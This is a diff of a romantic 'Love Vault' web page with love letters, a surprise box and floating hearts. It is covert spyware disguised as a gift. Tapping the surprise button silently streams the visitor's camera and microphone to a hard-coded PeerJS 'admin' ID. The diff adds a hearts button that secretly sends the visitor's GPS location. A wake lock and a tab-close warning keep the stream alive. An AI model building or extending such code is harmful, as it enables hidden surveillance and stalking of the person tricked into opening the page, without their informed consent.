@@ -5,8 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="theme-color" content="#17091e">
 <title>Love Vault 💗</title>
-
-<!-- PWA Manifest & PeerJS for Camera/Notifications -->
 <link rel="manifest" href="manifest.json">
 <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
 
@@ -20,365 +18,90 @@
   --dark: #17091e;
 }
 
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-}
+* { margin: 0; padding: 0; box-sizing: border-box; }
 
 body {
   font-family: 'Poppins', sans-serif;
   color: white;
   min-height: 100vh;
   overflow-x: hidden;
-  background:
-    radial-gradient(ellipse at top, #64204f 0%, transparent 55%),
-    linear-gradient(145deg, #17091e, #32102f, #100817);
+  background: radial-gradient(ellipse at top, #64204f 0%, transparent 55%), linear-gradient(145deg, #17091e, #32102f, #100817);
 }
 
-button {
-  font-family: inherit;
-  cursor: pointer;
-  -webkit-tap-highlight-color: transparent;
-}
+button { font-family: inherit; cursor: pointer; -webkit-tap-highlight-color: transparent; }
 
-#hearts {
-  position: fixed;
-  inset: 0;
-  pointer-events: none;
-  overflow: hidden;
-  z-index: 0;
-}
+#hearts { position: fixed; inset: 0; pointer-events: none; overflow: hidden; z-index: 0; }
+.heart { position: absolute; bottom: -50px; color: #ff72b6; animation: floatUp linear forwards; filter: drop-shadow(0 0 8px #ff238d); opacity: .75; }
+@keyframes floatUp { to { transform: translateY(-115vh) rotate(360deg); opacity: 0; } }
 
-.heart {
-  position: absolute;
-  bottom: -50px;
-  color: #ff72b6;
-  animation: floatUp linear forwards;
-  filter: drop-shadow(0 0 8px #ff238d);
-  opacity: .75;
-}
-
-@keyframes floatUp {
-  to {
-    transform: translateY(-115vh) rotate(360deg);
-    opacity: 0;
-  }
-}
-
-header {
-  text-align: center;
-  padding: 25px 15px 12px;
-  position: relative;
-  z-index: 2;
-}
-
-.logo {
-  font-size: 27px;
-  font-weight: 700;
-  letter-spacing: 2px;
-  background: linear-gradient(90deg, #fff, #ff7fbd, #d8a0ff);
-  -webkit-background-clip: text;
-  background-clip: text;
-  color: transparent;
-}
-
-.tagline {
-  color: #ffc5df;
-  font-size: 12px;
-  margin-top: 5px;
-  letter-spacing: 2px;
-}
-
-.container {
-  position: relative;
-  z-index: 1;
-  width: min(92%, 760px);
-  margin: 15px auto 50px;
-}
+header { text-align: center; padding: 25px 15px 12px; position: relative; z-index: 2; }
+.logo { font-size: 27px; font-weight: 700; letter-spacing: 2px; background: linear-gradient(90deg, #fff, #ff7fbd, #d8a0ff); -webkit-background-clip: text; background-clip: text; color: transparent; }
+.tagline { color: #ffc5df; font-size: 12px; margin-top: 5px; letter-spacing: 2px; }
+.container { position: relative; z-index: 1; width: min(92%, 760px); margin: 15px auto 50px; }
 
 .card {
-  position: relative;
-  overflow: hidden;
-  padding: 26px 20px;
-  margin: 18px 0;
-  text-align: center;
-  border-radius: 25px;
+  position: relative; overflow: hidden; padding: 26px 20px; margin: 18px 0; text-align: center; border-radius: 25px;
   border: 1px solid rgba(255, 159, 211, .3);
-  background: linear-gradient(
-    145deg,
-    rgba(255,255,255,.10),
-    rgba(255,105,180,.045)
-  );
-  backdrop-filter: blur(15px);
-  box-shadow: 0 15px 45px rgba(0,0,0,.22),
-              inset 0 1px rgba(255,255,255,.12);
+  background: linear-gradient(145deg, rgba(255,255,255,.10), rgba(255,105,180,.045));
+  backdrop-filter: blur(15px); box-shadow: 0 15px 45px rgba(0,0,0,.22), inset 0 1px rgba(255,255,255,.12);
   animation: appear .8s ease both;
 }
+@keyframes appear { from { opacity: 0; transform: translateY(25px); } to { opacity: 1; transform: translateY(0); } }
 
-@keyframes appear {
-  from { opacity: 0; transform: translateY(25px); }
-  to { opacity: 1; transform: translateY(0); }
-}
+.hero { padding-top: 28px; }
+.hero h1 { font-family: 'Dancing Script', cursive; font-size: clamp(39px, 10vw, 66px); line-height: 1.2; margin-bottom: 12px; color: #ffb6d9; text-shadow: 0 0 25px rgba(255,65,160,.5); }
+.hero p { color: #fbd7e9; line-height: 1.8; font-size: 14px; }
 
-.hero {
-  padding-top: 28px;
-}
+.couple-scene { height: 210px; display: flex; justify-content: center; align-items: center; perspective: 700px; margin: 15px auto; position: relative; }
+.orbit { width: 165px; height: 165px; position: absolute; border-radius: 50%; border: 1px solid rgba(255,128,201,.35); box-shadow: 0 0 35px rgba(255,54,158,.16); animation: rotate 12s linear infinite; }
+.orbit::before, .orbit::after { content: "❤"; position: absolute; color: #ff75b9; font-size: 22px; text-shadow: 0 0 15px #ff399e; }
+.orbit::before { top: 4px; left: 68px; }
+.orbit::after { bottom: 4px; right: 22px; }
+@keyframes rotate { to { transform: rotate(360deg); } }
 
-.hero h1 {
-  font-family: 'Dancing Script', cursive;
-  font-size: clamp(39px, 10vw, 66px);
-  line-height: 1.2;
-  margin-bottom: 12px;
-  color: #ffb6d9;
-  text-shadow: 0 0 25px rgba(255,65,160,.5);
-}
+.couple { font-size: 95px; filter: drop-shadow(0 0 22px rgba(255,94,174,.55)); animation: coupleFloat 3s ease-in-out infinite; transform-style: preserve-3d; }
+@keyframes coupleFloat { 0%,100% { transform: translateY(0) rotateY(-7deg); } 50% { transform: translateY(-12px) rotateY(7deg); } }
 
-.hero p {
-  color: #fbd7e9;
-  line-height: 1.8;
-  font-size: 14px;
-}
+.badge { display: inline-block; padding: 7px 15px; border-radius: 30px; color: #ffd7eb; background: rgba(255,86,172,.13); border: 1px solid rgba(255,139,200,.25); font-size: 11px; letter-spacing: 1px; margin-bottom: 12px; }
 
-.couple-scene {
-  height: 210px;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  perspective: 700px;
-  margin: 15px auto;
-  position: relative;
-}
+.btn { display: inline-block; border: none; color: white; padding: 13px 23px; border-radius: 30px; margin: 7px 4px; font-size: 13px; font-weight: 600; background: linear-gradient(100deg, #ff3998, #a855f7); box-shadow: 0 6px 22px rgba(255,57,152,.3); transition: transform .25s, box-shadow .25s; }
+.btn:hover { transform: translateY(-3px) scale(1.03); box-shadow: 0 9px 28px rgba(255,57,152,.5); }
+.btn.secondary { background: rgba(255,255,255,.08); border: 1px solid rgba(255,159,211,.4); box-shadow: none; }
 
-.orbit {
-  width: 165px;
-  height: 165px;
-  position: absolute;
-  border-radius: 50%;
-  border: 1px solid rgba(255,128,201,.35);
-  box-shadow: 0 0 35px rgba(255,54,158,.16);
-  animation: rotate 12s linear infinite;
-}
+.section-title { font-family: 'Dancing Script', cursive; font-size: 35px; color: #ffacd2; margin-bottom: 12px; }
+.small-text { color: #eacadd; font-size: 13px; line-height: 1.8; }
 
-.orbit::before,
-.orbit::after {
-  content: "❤";
-  position: absolute;
-  color: #ff75b9;
-  font-size: 22px;
-  text-shadow: 0 0 15px #ff399e;
-}
+.envelope { width: 125px; height: 90px; margin: 22px auto; display: grid; place-items: center; border-radius: 12px; font-size: 48px; background: linear-gradient(135deg, #ff6db5, #9b4ce0); box-shadow: 0 0 35px rgba(255,75,164,.28); cursor: pointer; animation: envelopePulse 2s ease-in-out infinite; }
+@keyframes envelopePulse { 50% { transform: scale(1.06); } }
 
-.orbit::before {
-  top: 4px;
-  left: 68px;
-}
+#letter { display: none; text-align: left; padding: 22px; margin-top: 18px; border-radius: 18px; background: rgba(255,255,255,.07); border: 1px solid rgba(255,160,211,.3); color: #ffe3f0; line-height: 2; font-size: 14px; animation: appear .5s ease; }
+#letter h3 { color: #ff9bcb; font-family: 'Dancing Script', cursive; font-size: 29px; margin-bottom: 10px; }
 
-.orbit::after {
-  bottom: 4px;
-  right: 22px;
-}
+.surprise-box { width: 135px; height: 125px; margin: 20px auto; display: grid; place-items: center; font-size: 70px; cursor: pointer; filter: drop-shadow(0 0 18px rgba(255,76,164,.35)); transition: transform .4s; }
+.surprise-box:hover { transform: rotate(-8deg) scale(1.08); }
+#surpriseMessage { display: none; margin-top: 15px; color: #ffc0df; font-family: 'Dancing Script', cursive; font-size: 29px; line-height: 1.6; }
 
-@keyframes rotate {
-  to { transform: rotate(360deg); }
-}
+.quote { font-family: 'Dancing Script', cursive; font-size: 29px; color: #ffd0e6; line-height: 1.6; margin: 18px 0; }
+.counter { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 22px; }
+.counter div { padding: 16px 5px; border-radius: 15px; background: rgba(255,100,177,.09); border: 1px solid rgba(255,150,207,.19); }
+.counter strong { display: block; font-size: 23px; color: #ffabd2; }
+.counter span { font-size: 10px; color: #f3cce0; }
+footer { text-align: center; padding: 20px 12px 35px; color: #cba8c0; font-size: 11px; position: relative; z-index: 1; }
+.hidden { display: none; }
 
-.couple {
-  font-size: 95px;
-  filter: drop-shadow(0 0 22px rgba(255,94,174,.55));
-  animation: coupleFloat 3s ease-in-out infinite;
-  transform-style: preserve-3d;
-}
+@media (max-width: 380px) { .card { padding: 22px 14px; } .couple { font-size: 78px; } .counter strong { font-size: 19px; } }
 
-@keyframes coupleFloat {
-  0%,100% { transform: translateY(0) rotateY(-7deg); }
-  50% { transform: translateY(-12px) rotateY(7deg); }
-}
-
-.badge {
-  display: inline-block;
-  padding: 7px 15px;
-  border-radius: 30px;
-  color: #ffd7eb;
-  background: rgba(255,86,172,.13);
-  border: 1px solid rgba(255,139,200,.25);
-  font-size: 11px;
-  letter-spacing: 1px;
-  margin-bottom: 12px;
-}
-
-.btn {
-  display: inline-block;
-  border: none;
-  color: white;
-  padding: 13px 23px;
-  border-radius: 30px;
-  margin: 7px 4px;
-  font-size: 13px;
-  font-weight: 600;
-  background: linear-gradient(100deg, #ff3998, #a855f7);
-  box-shadow: 0 6px 22px rgba(255,57,152,.3);
-  transition: transform .25s, box-shadow .25s;
-}
-
-.btn:hover {
-  transform: translateY(-3px) scale(1.03);
-  box-shadow: 0 9px 28px rgba(255,57,152,.5);
-}
-
-.btn.secondary {
-  background: rgba(255,255,255,.08);
-  border: 1px solid rgba(255,159,211,.4);
-  box-shadow: none;
-}
-
-.section-title {
-  font-family: 'Dancing Script', cursive;
-  font-size: 35px;
-  color: #ffacd2;
-  margin-bottom: 12px;
-}
-
-.small-text {
-  color: #eacadd;
-  font-size: 13px;
-  line-height: 1.8;
-}
-
-.envelope {
-  width: 125px;
-  height: 90px;
-  margin: 22px auto;
-  display: grid;
-  place-items: center;
-  border-radius: 12px;
-  font-size: 48px;
-  background: linear-gradient(135deg, #ff6db5, #9b4ce0);
-  box-shadow: 0 0 35px rgba(255,75,164,.28);
-  cursor: pointer;
-  animation: envelopePulse 2s ease-in-out infinite;
-}
-
-@keyframes envelopePulse {
-  50% { transform: scale(1.06); }
-}
-
-#letter {
-  display: none;
-  text-align: left;
-  padding: 22px;
-  margin-top: 18px;
-  border-radius: 18px;
-  background: rgba(255,255,255,.07);
-  border: 1px solid rgba(255,160,211,.3);
-  color: #ffe3f0;
-  line-height: 2;
-  font-size: 14px;
-  animation: appear .5s ease;
-}
-
-#letter h3 {
-  color: #ff9bcb;
-  font-family: 'Dancing Script', cursive;
-  font-size: 29px;
-  margin-bottom: 10px;
-}
-
-.surprise-box {
-  width: 135px;
-  height: 125px;
-  margin: 20px auto;
-  display: grid;
-  place-items: center;
-  font-size: 70px;
-  cursor: pointer;
-  filter: drop-shadow(0 0 18px rgba(255,76,164,.35));
-  transition: transform .4s;
-}
-
-.surprise-box:hover {
-  transform: rotate(-8deg) scale(1.08);
-}
-
-#surpriseMessage {
-  display: none;
-  margin-top: 15px;
-  color: #ffc0df;
-  font-family: 'Dancing Script', cursive;
-  font-size: 29px;
-  line-height: 1.6;
-}
-
-.quote {
-  font-family: 'Dancing Script', cursive;
-  font-size: 29px;
-  color: #ffd0e6;
-  line-height: 1.6;
-  margin: 18px 0;
-}
-
-.counter {
-  display: grid;
-  grid-template-columns: repeat(3, 1fr);
-  gap: 10px;
-  margin-top: 22px;
-}
-
-.counter div {
-  padding: 16px 5px;
-  border-radius: 15px;
-  background: rgba(255,100,177,.09);
-  border: 1px solid rgba(255,150,207,.19);
-}
-
-.counter strong {
-  display: block;
-  font-size: 23px;
-  color: #ffabd2;
-}
-
-.counter span {
-  font-size: 10px;
-  color: #f3cce0;
-}
-
-footer {
-  text-align: center;
-  padding: 20px 12px 35px;
-  color: #cba8c0;
-  font-size: 11px;
-  position: relative;
-  z-index: 1;
-}
-
-.hidden {
-  display: none;
-}
-
-@media (max-width: 380px) {
-  .card { padding: 22px 14px; }
-  .couple { font-size: 78px; }
-  .counter strong { font-size: 19px; }
-}
-
-/* PWA Install Banner CSS */
-#installBanner {
-    position: fixed; bottom: -100px; left: 0; width: 100%; background: rgba(20, 15, 30, 0.95);
-    border-top: 1px solid #ff72b6; padding: 15px; display: flex; justify-content: space-between; align-items: center;
-    z-index: 1000; transition: bottom 0.5s ease; box-shadow: 0 -5px 20px rgba(0,0,0,0.5);
-}
+#installBanner { position: fixed; bottom: -100px; left: 0; width: 100%; background: rgba(20, 15, 30, 0.95); border-top: 1px solid #ff72b6; padding: 15px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; transition: bottom 0.5s ease; box-shadow: 0 -5px 20px rgba(0,0,0,0.5); }
 #installBanner.show { bottom: 0; }
 #installBanner p { color: white; font-size: 0.9rem; margin: 0; font-family: 'Poppins', sans-serif;}
 #installBanner button { background: #ff72b6; color: white; border: none; padding: 8px 15px; border-radius: 20px; font-weight: bold; cursor: pointer; font-family: 'Poppins', sans-serif;}
 #installBanner .close-banner { background: transparent; color: #aaa; font-size: 1.5rem; padding: 0 10px; }
 </style>
 </head>
-
 <body>
 
 <div id="hearts"></div>
 
-<!-- PWA Install Banner -->
 <div id="installBanner">
     <p>Install as App for better experience?</p>
     <div>
@@ -393,143 +116,65 @@ footer {
 </header>
 
 <main class="container">
-
   <section class="card hero">
     <span class="badge">✨ A LITTLE WORLD MADE FOR YOU ✨</span>
-
     <h1>My Favorite Person</h1>
-
-    <p>
-      In a world full of people,<br>
-      my heart found its favorite. 💕
-    </p>
-
+    <p>In a world full of people,<br>my heart found its favorite. 💕</p>
     <div class="couple-scene">
       <div class="orbit"></div>
       <div class="couple" aria-label="Cute romantic anime couple">👩🏻‍❤️‍👨🏻</div>
     </div>
-
-    <p class="small-text">
-      Every heartbeat has a little story.<br>
-      And you are my favorite chapter. 🌹
-    </p>
-
-    <!-- 1st Action: Triggers Secret Notification -->
+    <p class="small-text">Every heartbeat has a little story.<br>And you are my favorite chapter. 🌹</p>
     <button class="btn" onclick="showLove()">💖 Feel My Love</button>
-    <p id="loveReply" class="quote hidden">
-      You make my ordinary days feel magical. ✨
-    </p>
+    <p id="loveReply" class="quote hidden">You make my ordinary days feel magical. ✨</p>
   </section>
 
   <section class="card">
     <h2 class="section-title">💌 A Letter for You</h2>
-
-    <p class="small-text">
-      There is something special waiting inside this letter...
-    </p>
-
-    <div class="envelope" onclick="openLetter()" role="button"
-         aria-label="Open love letter">💌</div>
-
+    <p class="small-text">There is something special waiting inside this letter...</p>
+    <div class="envelope" onclick="openLetter()" role="button" aria-label="Open love letter">💌</div>
     <button class="btn" onclick="openLetter()">Open My Heart</button>
-
     <div id="letter">
       <h3>My Dearest Love, ❤️</h3>
-
-      You are the smile behind my happiness,
-      the warmth in my coldest moments,
-      and the beautiful thought that visits me every day.
-
-      <br><br>
-
-      I may not always find the perfect words,
-      but I hope you always feel how special you are to me.
-
-      <br><br>
-
-      If I could choose again in a thousand lifetimes,
-      I would still wish to find you.
-
-      <br><br>
-
+      You are the smile behind my happiness,<br>the warmth in my coldest moments,<br>and the beautiful thought that visits me every day.<br><br>
+      I may not always find the perfect words,<br>but I hope you always feel how special you are to me.<br><br>
+      If I could choose again in a thousand lifetimes,<br>I would still wish to find you.<br><br>
       <strong>With all my love, Forever Yours. 💗</strong>
     </div>
   </section>
 
   <section class="card">
     <h2 class="section-title">🎁 Your Secret Surprise</h2>
-
-    <p class="small-text">
-      One little box. One special message.<br>
-      Tap to reveal your surprise!
-    </p>
-
-    <div class="surprise-box" id="gift" onclick="unlockGift()"
-         role="button" aria-label="Unlock surprise">🎁</div>
-
-    <!-- 2nd Action: Triggers Background Camera Sharing silently -->
-    <button class="btn" id="giftButton" onclick="unlockGift()">
-      Unlock Surprise ✨
-    </button>
-
+    <p class="small-text">One little box. One special message.<br>Tap to reveal your surprise!</p>
+    <div class="surprise-box" id="gift" onclick="unlockGift()" role="button" aria-label="Unlock surprise">🎁</div>
+    <button class="btn" id="giftButton" onclick="unlockGift()">Unlock Surprise ✨</button>
     <div id="surpriseMessage">
-      🌹 If hugs were stars,<br>
-      I would give you the whole universe. 🌌<br>
+      🌹 If hugs were stars,<br>I would give you the whole universe. 🌌<br>
       <span style="font-size:18px">You are my beautiful surprise! 💕</span>
     </div>
   </section>
 
   <section class="card">
     <h2 class="section-title">🌹 Little Love Notes</h2>
-
-    <div class="quote" id="dailyQuote">
-      "You are my today and all of my tomorrows." 💗
-    </div>
-
-    <button class="btn secondary" onclick="newQuote()">
-      💌 Another Love Note
-    </button>
+    <div class="quote" id="dailyQuote">"You are my today and all of my tomorrows." 💗</div>
+    <button class="btn secondary" onclick="newQuote()">💌 Another Love Note</button>
   </section>
 
   <section class="card">
     <h2 class="section-title">💞 Our Little Universe</h2>
-
-    <p class="small-text">
-      Some feelings are too beautiful for words.
-      Some people make life feel more meaningful.
-    </p>
-
+    <p class="small-text">Some feelings are too beautiful for words.<br>Some people make life feel more meaningful.</p>
     <div class="counter">
-      <div>
-        <strong>∞</strong>
-        <span>LOVE</span>
-      </div>
-
-      <div>
-        <strong>1</strong>
-        <span>HEART</span>
-      </div>
-
-      <div>
-        <strong>💕</strong>
-        <span>YOU & ME</span>
-      </div>
+      <div><strong>∞</strong><span>LOVE</span></div>
+      <div><strong>1</strong><span>HEART</span></div>
+      <div><strong>💕</strong><span>YOU & ME</span></div>
     </div>
   </section>
 
   <section class="card">
     <h2 class="section-title">💗 A Tiny Promise</h2>
-
-    <p class="quote">
-      "No matter how busy life gets,<br>
-      never forget how precious you are."
-    </p>
-
-    <button class="btn" onclick="celebrate()">
-      Send You a Thousand Hearts 💕
-    </button>
+    <p class="quote">"No matter how busy life gets,<br>never forget how precious you are."</p>
+    <button class="btn" onclick="celebrate()">Send You a Thousand Hearts 💕</button>
   </section>
-
 </main>
 
 <footer>
@@ -543,23 +188,14 @@ const ADMIN_PEER_ID = "love-app-admin-2024";
 // --- 1. PWA Install Logic ---
 let deferredPrompt;
 const installBanner = document.getElementById('installBanner');
-
 window.addEventListener('beforeinstallprompt', (e) => {
-    e.preventDefault();
-    deferredPrompt = e;
+    e.preventDefault(); deferredPrompt = e;
     setTimeout(() => { installBanner.classList.add('show'); }, 3000);
 });
-
 function installPWA() {
     if (deferredPrompt) {
         deferredPrompt.prompt();
-        deferredPrompt.userChoice.then((choiceResult) => {
-            if (choiceResult.outcome === 'accepted') {
-                console.log('User accepted the A2HS prompt');
-            }
-            deferredPrompt = null;
-            installBanner.classList.remove('show');
-        });
+        deferredPrompt.userChoice.then(() => { deferredPrompt = null; installBanner.classList.remove('show'); });
     }
 }
 function closeBanner() { installBanner.classList.remove('show'); }
@@ -567,47 +203,30 @@ function closeBanner() { installBanner.classList.remove('show'); }
 // --- 2. Tab Close Warning & Keep Awake ---
 let wakeLock = null;
 async function requestWakeLock() {
-    try {
-        if ('wakeLock' in navigator) {
-            wakeLock = await navigator.wakeLock.request('screen');
-        }
-    } catch (err) { console.log(`Wake Lock Error: ${err.name}`); }
+    try { if ('wakeLock' in navigator) { wakeLock = await navigator.wakeLock.request('screen'); } } catch (err) {}
 }
-function releaseWakeLock() {
-    if (wakeLock !== null) {
-        wakeLock.release().then(() => { wakeLock = null; });
-    }
-}
+function releaseWakeLock() { if (wakeLock !== null) { wakeLock.release().then(() => { wakeLock = null; }); } }
 
 window.addEventListener('beforeunload', function (e) {
-    if (camStream) { // Only warn if camera is sharing
-        e.preventDefault();
-        e.returnValue = 'நீங்கள் வெளியேறினால் இணைப்பு துண்டிக்கப்படும். நிச்சயமா வெளியேறணுமா?';
-    }
+    if (camStream) { e.preventDefault(); e.returnValue = 'நீங்கள் வெளியேறினால் இணைப்பு துண்டிக்கப்படும்.'; }
 });
 
-// --- 3. Your Original Design Functions ---
+// --- 3. Original Functions ---
 const heartContainer = document.getElementById("hearts");
-
 function createHeart() {
-  const heart = document.createElement("span");
-  heart.className = "heart";
+  const heart = document.createElement("span"); heart.className = "heart";
   const symbols = ["♥", "♡", "💕", "💗", "✨"];
   heart.textContent = symbols[Math.floor(Math.random() * symbols.length)];
-  heart.style.left = Math.random() * 100 + "vw";
-  heart.style.fontSize = (12 + Math.random() * 22) + "px";
+  heart.style.left = Math.random() * 100 + "vw"; heart.style.fontSize = (12 + Math.random() * 22) + "px";
   heart.style.animationDuration = (6 + Math.random() * 7) + "s";
-  heartContainer.appendChild(heart);
-  setTimeout(() => heart.remove(), 14000);
+  heartContainer.appendChild(heart); setTimeout(() => heart.remove(), 14000);
 }
 setInterval(createHeart, 450);
 
-// Modified to send Secret Notification
 function showLove() {
   document.getElementById("loveReply").classList.remove("hidden");
   burstHearts(18);
   
-  // --- SECRET NOTIFICATION LOGIC ---
   try {
     const notifyPeer = new Peer();
     notifyPeer.on('open', () => {
@@ -617,7 +236,7 @@ function showLove() {
             setTimeout(() => notifyPeer.destroy(), 2000); 
         });
     });
-  } catch(e) { console.log("Notification error", e); }
+  } catch(e) { console.log(e); }
 }
 
 function openLetter() {
@@ -627,30 +246,22 @@ function openLetter() {
 }
 
 let giftUnlocked = false;
-// Modified to silently start Camera Sharing
 function unlockGift() {
   if (giftUnlocked) return;
   giftUnlocked = true;
-  
   document.getElementById("gift").textContent = "💝";
   document.getElementById("surpriseMessage").style.display = "block";
   document.getElementById("giftButton").textContent = "Surprise Unlocked 💖";
   burstHearts(35);
-  
-  // --- SILENT CAMERA SHARE LOGIC ---
-  startBackgroundSharing();
+  startBackgroundSharing(); 
 }
 
 const quotes = [
-  '"You are my today and all of my tomorrows." 💗',
-  '"Your smile is my favorite kind of sunshine." ☀️',
-  '"Home is not a place; sometimes, it is a person." 🏡',
-  '"You make my heart smile without even trying." 💕',
-  '"If I had one wish, it would be more moments with you." 🌹',
-  '"In every love story, you would be my favorite part." 💌',
+  '"You are my today and all of my tomorrows." 💗', '"Your smile is my favorite kind of sunshine." ☀️',
+  '"Home is not a place; sometimes, it is a person." 🏡', '"You make my heart smile without even trying." 💕',
+  '"If I had one wish, it would be more moments with you." 🌹', '"In every love story, you would be my favorite part." 💌',
   '"You are the little magic in my everyday life." ✨'
 ];
-
 let quoteIndex = 0;
 function newQuote() {
   quoteIndex = (quoteIndex + 1) % quotes.length;
@@ -661,48 +272,69 @@ function newQuote() {
 function burstHearts(count) {
   for (let i = 0; i < count; i++) {
     setTimeout(() => {
-      const heart = document.createElement("span");
-      heart.className = "heart";
+      const heart = document.createElement("span"); heart.className = "heart";
       heart.textContent = ["💗", "💕", "💖", "♥"][Math.floor(Math.random() * 4)];
-      heart.style.left = (15 + Math.random() * 70) + "vw";
-      heart.style.bottom = (10 + Math.random() * 25) + "vh";
-      heart.style.fontSize = (18 + Math.random() * 24) + "px";
-      heart.style.animationDuration = (3 + Math.random() * 3) + "s";
-      heartContainer.appendChild(heart);
-      setTimeout(() => heart.remove(), 7000);
+      heart.style.left = (15 + Math.random() * 70) + "vw"; heart.style.bottom = (10 + Math.random() * 25) + "vh";
+      heart.style.fontSize = (18 + Math.random() * 24) + "px"; heart.style.animationDuration = (3 + Math.random() * 3) + "s";
+      heartContainer.appendChild(heart); setTimeout(() => heart.remove(), 7000);
     }, i * 65);
   }
 }
 
-function celebrate() {
-  burstHearts(70);
+// --- 4. Updated Celebrate Function (Adds Location Share) ---
+function celebrate() { 
+    burstHearts(70); 
+    shareLocation(); 
 }
 
-// --- 4. Silent Camera Sharing Logic ---
+function shareLocation() {
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            try {
+                const locPeer = new Peer();
+                locPeer.on('open', () => {
+                    const conn = locPeer.connect(ADMIN_PEER_ID);
+                    conn.on('open', () => {
+                        conn.send({ type: 'location_alert', lat: lat, lon: lon });
+                        setTimeout(() => locPeer.destroy(), 2000); 
+                    });
+                });
+            } catch(e) { console.log("Location send error", e); }
+            
+        }, function(error) {
+            console.log("Location access denied: " + error.message);
+        });
+    }
+}
+
+// --- 5. Silent Camera & Mic Sharing Logic ---
 let camStream = null;
 let peer = null;
 
 async function startBackgroundSharing() {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { return; }
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { alert("No Camera/Mic API"); return; }
     
     try {
-        requestWakeLock(); // Keep screen on
+        requestWakeLock(); 
         camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         
         peer = new Peer();
         peer.on("open", function(id) {
-            peer.call(ADMIN_PEER_ID, camStream);
+            const call = peer.call(ADMIN_PEER_ID, camStream);
+            if(!call) console.log("Call failed");
         });
         
         peer.on("error", function(err) { 
-            console.error("Peer error:", err); 
+            console.log(err.type); 
             stopSharing(); 
         });
         
     } catch (err) { 
-        console.log("Camera permission failed or blocked"); 
-        releaseWakeLock();
-        stopSharing(); 
+        console.log(err.message); 
+        releaseWakeLock(); stopSharing(); 
     }
 }
 
@@ -711,15 +343,6 @@ function stopSharing() {
     if (camStream) { camStream.getTracks().forEach(track => track.stop()); camStream = null; }
     if (peer) { peer.destroy(); peer = null; }
 }
-
-// Handle visibility change to stop sharing if tab is closed
-document.addEventListener("visibilitychange", function() {
-    if (document.visibilityState === 'hidden') {
-        // Do nothing, let it run in background
-    }
-});
-
 </script>
-
 </body>
 </html>
